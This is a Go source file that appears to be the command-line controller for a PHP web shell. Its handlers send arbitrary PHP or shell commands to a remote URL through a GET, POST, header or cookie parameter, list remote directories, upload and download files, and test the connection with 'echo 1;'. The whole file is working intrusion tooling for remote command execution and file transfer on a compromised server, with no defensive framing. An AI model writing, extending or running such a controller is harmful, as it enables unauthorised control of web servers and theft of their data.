package app

import (
	"fmt"
	"fuzzer"
	"fuzzer/src/commander"
	"fuzzer/src/common"
	"fuzzer/src/reader"
	"strings"

	"github.com/urfave/cli"
)

func (main *MainInterface) SendRawPHP(c *cli.Context) {
	cmd := strings.Join(c.Args(), " ")
	result, err := commander.Process(cmd)

	if err {
		return
	}

	reader.Read(result)
}

func (main *MainInterface) SendLs(c *cli.Context) {
	var ls string

	if c.Bool("raw") {
		r := "ls " + strings.Join(c.Args(), " ")
		ls = fuzzer.CMD.Raw(r)
	} else {
		context := c.Args().Get(0)
		ls = fuzzer.CMD.Ls(context)
	}

	result, err := commander.Process(ls)

	if err {
		return
	}

	reader.ReadEncode(result)
}

func (main *MainInterface) SendTest(c *cli.Context) {
	result, err := commander.Process("echo 1;")

	if err {
		return
	}

	common.ReceiveOne(result, "Connected")
}

func (main *MainInterface) SendUpload(c *cli.Context) {
	arr := c.Args()

	if len(arr) < 1 {
		fmt.Println("Please write the path of the local file to upload")
		return
	}

	path := arr.First()
	pathArr := strings.Split(path, "/")
	lgt := len(pathArr) - 1
	dir := pathArr[lgt]

	if len(arr) > 1 {
		dir = arr.Get(1)
	}

	common.Upload(path, dir)
}

func (main *MainInterface) SendDownload(c *cli.Context) {
	arr := c.Args()

	if len(arr) < 1 {
		fmt.Println("Please write the path of the local file to upload")
		return
	}

	path := arr[0]

	common.Download(path)
}

func (main *MainInterface) ServerSetup(c *cli.Context) {
	srv := &fuzzer.NET

	if c.Bool("i") {
		fmt.Println("url : " + srv.GetUrl())
		fmt.Println("method : " + srv.GetMethodStr())
		fmt.Println("parameter : " + srv.GetParameter())
		return
	}

	url := c.String("u")
	method := c.Int("m")
	parameter := c.String("p")
	crypt := false

	if url == "" && srv.GetUrl() == "" {
		fmt.Println("Flag -u (url) is required")
		return
	}

	if method > 4 {
		fmt.Println("Method is between 0 (default) and 4. [0 => GET, 1 => POST, 3 => HEADER, 4 => COOKIE]")
		return
	}

	if parameter == "" {
		parameter = srv.GetParameter()
	}

	srv.SetConfig(url, method, parameter, crypt)

	result, err := commander.Process("echo 1;")

	if err || result != "1" {
		fmt.Println("An error occured with the host")
		fmt.Println(result)
		return
	}

	prompt := "\033[32m•\033[0m\033[32m»\033[0m "
	main.SetPrompt(prompt)
}

func (main *MainInterface) ServerInfo(c *cli.Context) {
	if fuzzer.NET.GetResponse() == nil {
		fmt.Println("You havn't made any request. You must make a request before being able to see information")
		return
	}

	if len(c.Args()) < 1 {
		fmt.Println("Request => ")
		requestInfo(c)

		fmt.Println("Response => ")
		responseInfo(c)

		return
	}

	item := c.Args().Get(0)

	if item == "request" {
		requestInfo(c)
		return
	}

	if item == "response" {
		responseInfo(c)
		return
	}

	fmt.Println("The item : " + item + " is not specified. Please refer to srv info -h for more information")
}
